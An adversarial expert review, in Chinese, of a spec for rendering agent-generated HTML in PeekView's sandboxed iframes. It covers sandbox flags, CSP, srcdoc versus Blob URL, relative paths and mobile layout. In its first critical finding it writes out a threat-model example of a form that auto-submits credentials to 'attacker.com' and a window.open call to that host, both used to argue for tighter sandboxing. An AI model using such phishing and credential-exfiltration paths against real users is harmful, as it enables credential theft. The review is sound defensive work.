# spec-html-render v1.2 — 对抗式专家评审

> Reviewer: Independent Reviewer (Security / Frontend / Product)
> Date: 2026-05-18
> Subject: `docs/specs/spec-html-render.md` v1.2
> Style: 对抗式 — 只列要改的，不列写得好的

---

## 评审结论概览

| 级别 | 数量 | 说明 |
|------|------|------|
| 🔴 CRITICAL | 2 | 上线就出问题 / 安全风险被低估 |
| 🟠 HIGH | 4 | 实现阶段一定卡住 / 用户必然踩坑 |
| 🟡 MEDIUM | 4 | 应在 P2 前解决 |
| 🟢 LOW | 3 | 文档质量、可读性 |

**总体判断：** 安全模型方向正确，但**仍有一个被忽略的、能让攻击者把 PeekView 变成钓鱼站的高危场景**。多文件相对路径、CDN 依赖、Copy 语义这几处的产品判断也偏乐观，建议进 P1 前回过头来再修一次 spec。

---

## 🔴 CRITICAL-1：iframe 内可发起 `top.location` 之外的任意跳转和外部表单提交，PeekView 等于免费的钓鱼跳板

**位置：** §3.2 sandbox 设计

**问题：**

当前 sandbox 配置：
```
allow-scripts allow-forms allow-popups
```

去掉 `allow-same-origin` 解决了 cookie/localStorage 窃取和沙盒逃逸。但是 spec 把"iframe 内脚本可发起 fetch"轻描淡写成"与直接打开 HTML 文件无本质区别，本期记录在案"，**这个判断是错的**。差异是巨大的：

1. **`peekview create` 让 Agent 生成的内容获得了 peekview 域名下的 URL。** 当用户在自己企业的内网部署 peekview，或域名是 `peekview.公司.com` 时，这个 URL 自带"我们公司内部工具"的信任背书。
2. **`allow-forms`** 让 iframe 内可以构造 `<form action="https://attacker.com/login" method="POST">` 并自动 submit。配合 `allow-popups` 一起，钓鱼登录页 + 凭据回传链路全部可行。
3. **`allow-popups`** 让 `window.open('https://attacker.com')` 可行，**且新打开的 tab 与父页面解除了 opener 关系还是没解除？** spec 没有说。如果没加 `allow-popups-to-escape-sandbox` 那 popup 本身仍在沙盒里 —— 但浏览器实现的细节差异（Safari 与 Chrome 不一致）需要明确测试，不能口头保证。

**与"直接打开 HTML 文件"的差异：**

| 维度 | 用户直接打开 .html | 在 PeekView 打开 |
|------|------------------|----------------|
| URL 域名 | `file://` 或 `null` | `peekview.xxx.com`，**可分享、可被信任** |
| 用户预期 | 我打开了一个本地文件 | 我在看公司内部工具 |
| 攻击放大 | 单人受害 | **一条链接群发** |

**修复建议（必须在 P2 前确定）：**

A. **明确 `allow-popups` 的取舍。** 如果不需要 `window.open`（Agent 生成的展示型网页基本用不上），**砍掉**。文档里写明"内联交互可以，弹窗式跳转不行"。

B. **`allow-forms` 同理重新评估。** 报告、简历、图表这些场景几乎不需要 form 提交。砍掉之后，钓鱼路径少一半。

C. **如果保留以上权限，则后端必须立即（不是"后续"）配上 CSP：**
```
Content-Security-Policy: sandbox allow-scripts; default-src 'none'; ...
```
仅依赖 HTML 属性的 sandbox 是**只对该 iframe 元素生效**，但同时通过响应头下发 CSP 的 sandbox 指令可以作为第二道防线（对直接通过 download endpoint 访问 .html 文件的情况也生效）。

D. **明确禁止 `formaction` 属性的逃逸：** 即便 `allow-forms` 被砍，`<button formaction=...>` 在某些上下文仍可触发顶层导航，需测试覆盖。

E. **加入 `referrerpolicy="no-referrer"`** —— 这点 spec 已经做了 ✅，但要在评审文档里记录为"已防 referer 泄露"。

**不修复的后果：** 一旦 peekview 部署到了任何有信任度的域名下，"通过 peekview 链接发钓鱼页"是一个一行代码就能实现的攻击。

---

## 🔴 CRITICAL-2：`srcdoc` 的字符串注入边界 spec 完全没提，引号转义错一次就是 XSS

**位置：** §3.2 实现示例

**问题：**

spec 给出的伪代码：
```html
<iframe :srcdoc="content" ... />
```

Vue 的 `:srcdoc` 属性绑定会把 `content` 作为字符串赋给 DOM 属性，浏览器内部会把 `srcdoc` 的内容当作完整 HTML 文档解析。**这本身是安全的（不会触发 attribute 注入）**，但有两个雷区 spec 没说：

1. **`srcdoc` 属性总长度限制。** 不同浏览器对 attribute 总长度的支持不一样（Safari 历史上有 64KB 左右的软限制，新版改善但未文档化）。spec 把"性能警告"定在 512KB，但 **functional 上限**没定义。如果用户传一个 800KB 的内联 base64 图片 HTML，在某些浏览器上会**直接渲染失败，且无错误提示**。

2. **更安全的实现方式：`Blob URL` 而非 `srcdoc`。**
   ```js
   const blob = new Blob([content], { type: 'text/html' })
   iframe.src = URL.createObjectURL(blob)
   ```
   - 无属性长度限制
   - 与 sandbox 配合时同样运行在 null origin（如不加 `allow-same-origin`）
   - 浏览器可流式解析，大文件性能更好
   - 需要在 unmount 时 `URL.revokeObjectURL` 防止内存泄漏

**修复建议：**

- 在 §3.2 增加"实现方式选择"小节，明确权衡 `srcdoc` vs `Blob URL`，并给出选择标准（如 > 256KB 改用 Blob URL）。
- 或者**直接全部用 Blob URL**，简化心智模型，性能上限也明确。
- 必须在 §5 边界情况增加："超过 [X]KB 的 HTML 在 Safari/Chrome/Firefox 的表现，需要 P3 截图验证"。

---

## 🟠 HIGH-1：CDN 外链网页**在 PeekView 域名下加载**，CSP 与第三方 cookie 行为 spec 没考虑

**位置：** §1.3 / §3.4 提到的 "Tailwind CDN + Alpine.js" 场景

**问题：**

Agent 生成的网页大量依赖 CDN。但是：

1. **如果 peekview 主域名已经配了 CSP**（即便现在没有，将来一定会有），`<iframe srcdoc>` 内嵌的页面**继承**或**不继承**父页面 CSP 取决于浏览器实现 —— 简短结论是：**srcdoc iframe 继承父文档 CSP**（这是 HTML 规范）。所以一旦 peekview 上了一个稍严的 CSP（比如 `script-src 'self' 'unsafe-inline'`），**所有 CDN 网页全部立刻全部白屏**。
2. spec §1.3 把 "Tailwind CDN" 列为典型场景，但 §3 完全没讨论 CSP 继承。这是个**实现阶段必踩**的坑。

**修复建议：**

- §3.2 加一节"CSP 继承行为"，写明：srcdoc iframe 继承父文档 CSP，所以**部署 peekview 时必须为 `/entries/*` 详情页路由设计单独的（宽松的）CSP**，或者改用 Blob URL（Blob URL 的 CSP 继承行为不同，但同样需要明确）。
- 把这作为 P3 验证的必测项："在 peekview 主页加 CSP 后，iframe 内 CDN 资源是否能加载"。

---

## 🟠 HIGH-2：多文件相对路径"静默失败"是错的产品决策

**位置：** §3.4

**问题：**

spec 决定"相对路径资源静默失败，文档说明此限制"。这违反了"显式优于隐式"。Agent 生成的多文件 HTML（index.html + style.css + main.js）**是非常常见的产物**，让它默默丢样式 + 不提示用户，会导致：

1. 用户以为是 Agent 生成的代码有 bug，去改 Agent prompt
2. 用户向 peekview 报 bug，认为渲染坏了
3. 项目 owner（你）每周回答一次"为什么我的 CSS 不生效"

**修复建议（任选其一）：**

A. **检测 + 警告：** HtmlViewer 解析 HTML 字符串（DOMParser），统计 `<link href="...">`、`<script src="...">`、`<img src="...">` 中的相对路径数量，> 0 时在 iframe 上方显示提示条："此 HTML 含 N 个本地资源引用，PeekView 当前不支持多文件相对路径，资源不会加载。"

B. **改 spec：** 把多文件支持升为 P0 的一部分，通过 srcdoc 启动时把同 entry 内文件以 inline `<style>` / `<script>` 形式注入。这是有限重写，可行性高。

C. **限制场景：** 在 CLI 侧 `peekview create *.html` 时检测，如果 HTML 引用了相对路径资源，**警告并建议用 `--inline` 或单文件版本**。

**最低底线：必须做 A。** 静默失败是产品级别的坏决策。

---

## 🟠 HIGH-3：Copy 的语义在 HTML 场景下与用户心智不一致

**位置：** §3.5 操作行为定义

**问题：**

spec 写："Copy → 复制 HTML 源码，与 Markdown、代码文件一致"。但是：

- Markdown 文件：用户看到渲染结果，Copy 拿到 markdown 源码 → 自洽（用户知道这是 markdown）
- 代码文件：用户看到代码，Copy 拿到代码 → 自洽
- **HTML 文件：用户看到一个渲染好的网页**（看不见源码），Copy 拿到一段 HTML → **不自洽**

用户的预期分两种：
- "复制这个网页的文字内容"（document.body.innerText）—— 类似浏览器选中文字复制
- "复制网页源码用于二次开发" —— 当前 spec 选的

第二种是技术用户的预期，但 PeekView 的目标用户里也有"接收 Agent 生成报告的非技术用户"（§1.3 报告/简历/演示文稿场景）。

**修复建议：**

- §3.5 增加说明："Copy 复制 HTML 源码，非渲染后的可见文本。" —— 明示而非默认。
- 或者：**HTML 文件类型的 Copy 按钮 tooltip 改成 "Copy HTML source"**，文字上做区分。
- 长期：考虑增加二级菜单 "Copy source / Copy as text"，但本期不做。

---

## 🟠 HIGH-4：iframe 高度策略 "撑满内容区剩余高度" 在移动端会出问题

**位置：** §3.2 iframe 高度策略

**问题：**

> "撑满内容区剩余高度，内容在 iframe 内自己滚动，不动态调整高度。"

桌面端 OK。移动端**地址栏滑出/收起**会让 viewport 高度动态变化，**iframe 内部已经在滚动**的内容会跟着抖（双层滚动容器）。这是已知的 mobile web 坑。

更糟：iOS Safari 上，iframe 内部滚动 + 父页面也在滚动，会出现 **scroll chaining 卡死** 现象。

**修复建议：**

- §3.3 移动端布局明确：iframe 高度策略采用 `min-height: calc(100dvh - header - actionbar)` 而非 100vh / 固定数值
- iframe 设置 `scrolling="yes"` 显式声明
- P3 验证项加："iOS Safari + Android Chrome 上滚动行为"

---

## 🟡 MEDIUM-1：512KB 警告阈值无依据，且与 backend `max_file_size=10MB` 不匹配

**位置：** §3.2 大文件处理

**问题：**

spec 选 512KB 作为"性能警告"阈值，但是：

- 后端 `PEEKVIEW_LIMITS__MAX_FILE_SIZE` 默认 10MB
- 512KB 之上到 10MB 之间这一大段（占绝大多数 HTML 文件区间），spec 怎么处理？只有一个"警告"，**没有上限**。

如果用户传一个 8MB 的 HTML（嵌入了高清图），iframe 会卡死整个页面（主线程被解析阻塞）。

**修复建议：**

| 区间 | 行为 |
|------|------|
| < 512KB | 正常渲染 |
| 512KB ~ 2MB | 显示性能警告条 + 仍渲染 |
| > 2MB | **不自动渲染**，显示 "文件较大" + 手动 "点击渲染" 按钮，避免阻塞 |

数值不是绝对的，但**必须有"大到不自动渲染"的兜底**。

---

## 🟡 MEDIUM-2：sandbox 属性变更对未来扩展的影响 spec 没记

**位置：** §3.2

**问题：**

未来如果要支持"Agent 生成的小游戏"（需要 `requestFullscreen`、`pointerLock` 等），需要新增 sandbox 权限。当前 spec 没有写"扩展决策路径"——下次有人来加权限时，没有依据可以回溯。

**修复建议：**

- §3.6 增加"扩展原则"：新增 sandbox 权限必须经过安全评审，每加一个 `allow-*` 都要在 spec 中记录"为什么需要、可能放大什么风险"。

---

## 🟡 MEDIUM-3：`canWrap` 的实现细节与 spec 不一致

**位置：** §4 前端改动范围

**问题：**

spec 写 "`canWrap` 排除 html 文件"。但是看代码 `frontend-v3/src/stores/entry.ts:26`，当前实现是：

```ts
const canWrap = computed(() => {
  if (!activeFile.value) return false
  if (activeFile.value.isBinary) return false
  if (activeFile.value.language === 'markdown') return false
  return true
})
```

改动应该是把 markdown 那行扩展为 markdown + html。spec 在 §4 表格里写"极小"，但**没指明应该用什么模式**（继续用 hardcode 还是改成一个 `nonCodeLanguages` 集合）。

**修复建议：**

- §4 改动描述明确："`canWrap` 增加 `activeFile.language === 'html'` 排除分支"，避免实现者按字面"排除 html"另起炉灶。
- 顺手提示：未来 markdown / html / pdf / image 会越来越多，建议抽 `isViewerType(activeFile, 'code'|'rich')` 工具函数，但本期可不做。

---

## 🟡 MEDIUM-4：缺少"HTML 文件无 entry 元信息覆盖"的场景说明

**位置：** §3.3 布局

**问题：**

HTML 网页通常自带 `<title>`、`<meta>`，PeekView 的 entry 也有 summary / 标题。两者**不一致时**显示哪个？

spec §3.3 布局图里 header 显示"标题"，但是没说：
- 是 entry summary？
- 还是 HTML 内的 `<title>`？
- 移动端 iframe 渲染后 `<title>` 还会去改 `document.title` 吗？（在 sandbox 中通常不会）

**修复建议：**

- §3.3 明确："header 显示 entry summary，iframe 内 `<title>` 不影响外层"。
- P3 验证："iframe 内 `<title>` 是否会污染 PeekView 页面 title"。

---

## 🟢 LOW-1：术语不统一

`HTML 文件`、`HTML 网页`、`HTML 文档` 在文档中混用。建议统一为"HTML 文件"（与代码文件、Markdown 文件保持一致命名）。

## 🟢 LOW-2：§5 边界情况表与 §3.4 多文件表内容重复

`HTML 文件包含外部 CDN 资源` 和 `使用 CDN 外链` 两处分别写。建议合并到 §5 单一 source of truth，§3.4 只保留"决策"。

## 🟢 LOW-3：P1 测试设计漏项

P1 当前只列了 5 项，但通读全文，至少漏了：
- 沙盒逃逸的 negative test（验证 iframe 内 `top.location` 修改失败）
- 大文件性能警告的触发测试
- CSP 继承场景测试（如果 HIGH-1 修复）
- 相对路径检测警告测试（如果 HIGH-2A 采纳）

---

## 评审建议路径

**P0 阻塞项（必须在 P1 前修 spec）：**
1. CRITICAL-1（sandbox 权限再裁剪 + CSP 联动）
2. CRITICAL-2（srcdoc vs Blob URL 选型）
3. HIGH-2（相对路径策略选 A/B/C）

**P1/P2 修订项（实现前明确）：**
- HIGH-1, HIGH-3, HIGH-4
- MEDIUM-1, MEDIUM-3

**可与实现并行修订：**
- MEDIUM-2, MEDIUM-4, LOW-*

---

## 一句话总结

> v1.2 把"沙盒逃逸"的硬伤修了，但**沙盒不是 XSS 的全部**。把 PeekView 看作"Agent 内容的发布平台"，安全模型需要考虑**钓鱼放大**而不仅是**单页 XSS**。目前 spec 还差这层视角。
